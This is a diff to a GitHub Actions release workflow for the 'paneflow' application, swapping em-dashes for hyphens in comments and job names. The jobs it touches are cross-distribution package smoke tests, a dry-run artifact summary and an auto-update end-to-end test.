-  # top-level jobs — GHA never cancels sibling top-level jobs on a
+  # top-level jobs - GHA never cancels sibling top-level jobs on a
   # peer's failure, so a Debian fail still surfaces the openSUSE
   # result. Inside each step, transient package-manager fetches are
   # wrapped in a small 3-attempt retry loop (US-002 AC6) to absorb
@@ -1526,13 +1526,13 @@ jobs:
   #
   # Smoke tests are intentionally x86_64-only even after US-019 adds
   # the aarch64 build matrix leg. The tests exercise postinst scripts
-  # (shell-only, arch-agnostic) — extending them to aarch64 would buy
+  # (shell-only, arch-agnostic) - extending them to aarch64 would buy
   # no additional coverage over the x86_64 run. Real aarch64
   # installation-and-runtime validation is US-020's scope (on-device
   # tests on a Raspberry Pi 5 / Asahi Linux).
 
   smoke-test-ubuntu:
-    name: Smoke test — Ubuntu 22.04 (.deb postinst)
+    name: Smoke test - Ubuntu 22.04 (.deb postinst)
     needs: build
     runs-on: ubuntu-22.04
     container: ubuntu:22.04
@@ -1546,7 +1546,7 @@ jobs:
         shell: bash
     steps:
       - name: Install baseline tools
-        # `apt-get install` inside the container — not the host runner.
+        # `apt-get install` inside the container - not the host runner.
         # `ca-certificates` + `curl` are required by our postinst's
         # GPG-fetch path.
         env:
@@ -1571,7 +1571,7 @@ jobs:
           DEBIAN_FRONTEND: noninteractive
         run: |
           set -euo pipefail
-          # `apt install` resolves runtime deps automatically — `dpkg -i`
+          # `apt install` resolves runtime deps automatically - `dpkg -i`
           # would leave them unconfigured and force a follow-up `apt -f`.
           apt-get install -y --no-install-recommends ./release-assets/paneflow-*.deb
 
@@ -1583,10 +1583,10 @@ jobs:
             /etc/apt/sources.list.d/paneflow.list
 
       - name: Assert `apt update` completes without error (Cursor regression)
-        # AC: `sudo apt update must complete without error` — modern apt
+        # AC: `sudo apt update must complete without error` - modern apt
         # exits 0 even if individual sources 404, emitting `W:` warnings.
         # A non-zero exit would mean the postinst wrote a MALFORMED
-        # sources line that broke the apt parser — the Cursor failure
+        # sources line that broke the apt parser - the Cursor failure
         # mode. Exit code is the test.
         run: |
           set -euo pipefail
@@ -1595,7 +1595,7 @@ jobs:
       - name: Assert paneflow visible via apt-cache policy
         run: |
           set -euo pipefail
-          # `apt-cache policy paneflow` prints `Installed: <version>` — our
+          # `apt-cache policy paneflow` prints `Installed: <version>` - our
           # crate version starts with 0 (0.1.x today) but the match must
           # not depend on that. Accept any digit-led version string.
           # Also use `dpkg-query` as a belt-and-braces check that catches
@@ -1608,7 +1608,7 @@ jobs:
           # gets SIGPIPE on its next write, which pipefail propagates as
           # a pipeline failure. Observed in the v0.2.3 release smoke
           # test. Here-strings have no writer process, so there is no
-          # SIGPIPE surface — the input is a fully-materialised string
+          # SIGPIPE surface - the input is a fully-materialised string
           # handed to grep's stdin before grep runs. dpkg-query output
           # is one line and has never been observed to flake, but we
           # switch it to the same pattern for consistency.
@@ -1617,7 +1617,7 @@ jobs:
           status=$(dpkg-query -W -f='${Status}' paneflow)
           grep -q 'install ok installed' <<< "$status"
 
-      - name: Idempotency — pre-existing paneflow.list is not overwritten
+      - name: Idempotency - pre-existing paneflow.list is not overwritten
         env:
           DEBIAN_FRONTEND: noninteractive
         run: |
@@ -1632,12 +1632,12 @@ jobs:
             || { echo "::error::postinst overwrote a pre-existing paneflow.list"; exit 1; }
 
   smoke-test-fedora:
-    name: Smoke test — Fedora 40 (.rpm postinst)
+    name: Smoke test - Fedora 40 (.rpm postinst)
     needs: build
     runs-on: ubuntu-22.04
     container: fedora:40
     # fedora:40 ships bash as /bin/sh already, but pin it explicitly
-    # here too — keeps the smoke jobs uniform and survives a future
+    # here too - keeps the smoke jobs uniform and survives a future
     # base-image swap (e.g., fedora:41+ or a minimal variant) without
     # silently regressing pipefail support.
     defaults:
@@ -1683,7 +1683,7 @@ jobs:
           # mirror is always there in a clean container).
           dnf list installed paneflow
 
-      - name: Idempotency — pre-existing paneflow.repo is not overwritten
+      - name: Idempotency - pre-existing paneflow.repo is not overwritten
         run: |
           set -euo pipefail
           # Write a pre-existing .repo file pointing at a dummy mirror;
@@ -1708,7 +1708,7 @@ jobs:
   # apt + glibc baseline. Catches Ubuntu-only assumptions in our
   # postinst (e.g. `apt-get` flag drift, snap-aware codepaths).
   smoke-test-debian:
-    name: Smoke test — Debian 12 (.deb postinst)
+    name: Smoke test - Debian 12 (.deb postinst)
     needs: build
     runs-on: ubuntu-22.04
     container: debian:bookworm-slim
@@ -1777,11 +1777,11 @@ jobs:
   # ─── US-002 AC2: openSUSE Tumbleweed (.rpm via zypper) ──────────────
   # Validates that our cargo-generate-rpm `Requires:` (vulkan-loader,
   # libxkbcommon, libxkbcommon-x11, fontconfig, freetype) resolves on
-  # zypper's package graph too — not only dnf's. A naming-drift
+  # zypper's package graph too - not only dnf's. A naming-drift
   # failure here means the .rpm needs a `Provides:`-aware fix before
   # we can claim openSUSE coverage on paneflow.dev.
   smoke-test-opensuse:
-    name: Smoke test — openSUSE Tumbleweed (.rpm postinst)
+    name: Smoke test - openSUSE Tumbleweed (.rpm postinst)
     needs: build
     runs-on: ubuntu-22.04
     container: opensuse/tumbleweed
@@ -1818,7 +1818,7 @@ jobs:
         # with `Signature verification failed [4-Signatures public
         # key is not available]`. `--no-gpg-checks` covers both
         # cases. The smoke test's purpose is install+postinst
-        # correctness, not signature validation — which is the
+        # correctness, not signature validation - which is the
         # job of the Phase-1 sha256 sidecar emitted by the build
         # job.
         run: |
@@ -1847,7 +1847,7 @@ jobs:
           fi
 
       - name: Assert %post wrote paneflow.repo
-        # openSUSE uses /etc/zypp/repos.d/ (not yum.repos.d/) — the
+        # openSUSE uses /etc/zypp/repos.d/ (not yum.repos.d/) - the
         # postinst.sh writes to whichever distro-canonical directory
         # exists, so on Tumbleweed this is the correct expected path.
         run: |
@@ -1867,7 +1867,7 @@ jobs:
   # don't catch this because their package managers resolve those
   # libs implicitly from `Requires:` / `depends:`.
   smoke-test-arch:
-    name: Smoke test — Arch Linux (tar.gz binary, no native PKGBUILD)
+    name: Smoke test - Arch Linux (tar.gz binary, no native PKGBUILD)
     needs: build
     runs-on: ubuntu-22.04
     container: archlinux:base
@@ -1933,7 +1933,7 @@ jobs:
   # release engineer can verify naming, size, and integrity at a
   # glance before deciding whether to cut the real tag.
   #
-  # Only runs in dry-run mode — the real release job already
+  # Only runs in dry-run mode - the real release job already
   # publishes the artifacts to GitHub Releases (which renders the
   # same SHA-256 sidecars next to each asset).
   dry-run-summary:
@@ -1959,7 +1959,7 @@ jobs:
             echo "## Dry-run artifacts (${DRYRUN_TAG})"
             echo
             echo "Built from \`${DRYRUN_REF}\`. Workflow artifacts have"
-            echo "7-day retention — download them from the Actions UI"
+            echo "7-day retention - download them from the Actions UI"
             echo "sidebar to inspect before cutting the real tag."
             echo
             echo "| Asset | Size | SHA-256 |"
@@ -1969,7 +1969,7 @@ jobs:
           # `sha256sum` is part of coreutils on ubuntu-22.04 (always
           # present). Sort by name so the table is deterministic across
           # runs and diffable between two back-to-back dry-runs. Skip
-          # the `*.sha256` sidecars we already emitted at build time —
+          # the `*.sha256` sidecars we already emitted at build time -
           # they would clutter the table and their content is the next
           # column anyway.
           while IFS= read -r -d '' f; do
@@ -1989,12 +1989,12 @@ jobs:
   # NEW from this checkout, serves a fixture `latest.json` + tarball
   # via python3's http.server on localhost, then runs OLD with
   # `--update-and-exit` (US-005 Rust flag) pointing at the fixture.
-  # Three scenarios — happy tar.gz swap, hash-mismatch rejection,
-  # feed-unreachable surfaced as exit 3 — all asserted by the script.
+  # Three scenarios - happy tar.gz swap, hash-mismatch rejection,
+  # feed-unreachable surfaced as exit 3 - all asserted by the script.
   #
   # Sits in `release.needs` so a tag cut never ships a binary that
   # can't actually self-update from the previous release. This is the
-  # ONLY automated test of `src-app/src/update/` — paneflow-app has no
+  # ONLY automated test of `src-app/src/update/` - paneflow-app has no
   # unit tests, so dropping this gate would ship updater regressions
   # silently. A previous nightly variant (auto_update_e2e.yml on cron)
   # was deleted 2026-05-27 as redundant with this release gate at the
@@ -2012,7 +2012,7 @@ jobs:
     # and E2E_OLD_TARBALL env vars and uses them directly when set
     # (scripts/test-update-e2e.sh). The NEW tarball is reused from
     # the matrix `build` job's artifact (already built + bundled +
-    # sha256-sided 5 minutes earlier — no point rebuilding). The OLD
+    # sha256-sided 5 minutes earlier - no point rebuilding). The OLD
     # tarball is fetched from the previous GitHub release, which is
     # strictly more faithful than a from-source rebuild: we now test
     # the exact byte sequence real users have on disk.
@@ -2056,7 +2056,7 @@ jobs:
 
       # Fetch the most recent published stable release as OLD. Selecting
       # the latest non-prerelease ensures the harness exercises the
-      # update path users would actually traverse — never a `-rc.N`
+      # update path users would actually traverse - never a `-rc.N`
       # build, which `release.published` already excludes from cask /
       # winget anyway. If no stable release exists yet (first release
       # ever, or first after a long pre-release train) the script's
@@ -2072,7 +2072,7 @@ jobs:
           # layer (stable JSON, no client-side regex needed). Take the
           # newest entry by createdAt (gh's default sort). Skip the tag
           # currently being released (RELEASE_TAG) when this run is a
-          # tag-push — otherwise we'd compare a tag against itself.
+          # tag-push - otherwise we'd compare a tag against itself.
           CURRENT_TAG="${RELEASE_TAG:-}"
           PREV_TAG="$(gh release list \
               --exclude-pre-releases \
@@ -2083,7 +2083,7 @@ jobs:
             | grep -v "^${CURRENT_TAG}$" \
             | head -n1)"
           if [ -z "${PREV_TAG}" ]; then
-            echo "No previous stable release found — harness will self-bootstrap to no-op"
+            echo "No previous stable release found - harness will self-bootstrap to no-op"
             echo "old_version=" >> "$GITHUB_OUTPUT"
             exit 0
           fi
@@ -2099,7 +2099,7 @@ jobs:
         run: |
           set -euo pipefail
           mkdir -p "${RUNNER_TEMP}/e2e-old"
-          # Pattern is suffix-only matcher (v-prefix-agnostic) — matches
+          # Pattern is suffix-only matcher (v-prefix-agnostic) - matches
           # both pre-v0.3.0 naming and v0.3.0+ naming.
           gh release download "${{ steps.prev_release.outputs.old_tag }}" \
             --pattern 'paneflow-*-x86_64.tar.gz' \
@@ -2108,15 +2108,15 @@ jobs:
 
       # The build artifact predates signing: the `.minisig` sidecars are
       # produced and uploaded by the publish job, which runs in PARALLEL
-      # with this leg. OLD clients ≥ v0.3.9 verify fail-closed — they
+      # with this leg. OLD clients ≥ v0.3.9 verify fail-closed - they
       # fetch `<tarball-url>.minisig` and abort the install when it is
-      # missing — so the harness needs the REAL signature of the NEW
+      # missing - so the harness needs the REAL signature of the NEW
       # tarball (first observed on v0.4.1: the happy path 404'd on the
       # fixture's .minisig and the leg went red despite a good release).
       # Poll the release until the publish job has attached it; the
       # artifact tarball and the published tarball are byte-identical,
       # so the signature transfers. Tag-push runs only: a dry-run
-      # publishes nothing — the harness then self-no-ops with a notice
+      # publishes nothing - the harness then self-no-ops with a notice
       # (see scripts/test-update-e2e.sh phase 1).
       - name: Fetch NEW tarball signature from the published release
         if: steps.prev_release.outputs.old_version != '' && github.event_name == 'push'
@@ -2127,7 +2127,7 @@ jobs:
           set -euo pipefail
           NEW_VERSION="$(awk -F'"' '/^version = / { print $2; exit }' Cargo.toml)"
           sig="paneflow-${NEW_VERSION}-x86_64.tar.gz.minisig"
-          # 60 × 15 s = 15 min cap — the publish job typically uploads
+          # 60 × 15 s = 15 min cap - the publish job typically uploads
           # within ~2 min of the last build leg finishing. If the cap
           # trips, publishing (or signing) itself is broken and THAT is
           # the failure to surface, not a missing-file 404 in the
@@ -2142,7 +2142,7 @@ jobs:
             fi
             sleep 15
           done
-          echo "::error::${sig} never appeared on ${TAG} after 15 min — publish leg failed or artifact signing is broken"
+          echo "::error::${sig} never appeared on ${TAG} after 15 min - publish leg failed or artifact signing is broken"
           exit 1
 
       - name: Run auto-update e2e harness
@@ -2179,7 +2179,7 @@ jobs:
       - name: Self-bootstrap skip notice
         if: steps.prev_release.outputs.old_version == ''
         run: |
-          echo "::notice::No previous stable release published yet — auto-update e2e is a no-op for the first release. Will engage on the next tag cut."
+          echo "::notice::No previous stable release published yet - auto-update e2e is a no-op for the first release. Will engage on the next tag cut."
 
       - name: Upload e2e logs on failure
         if: failure()
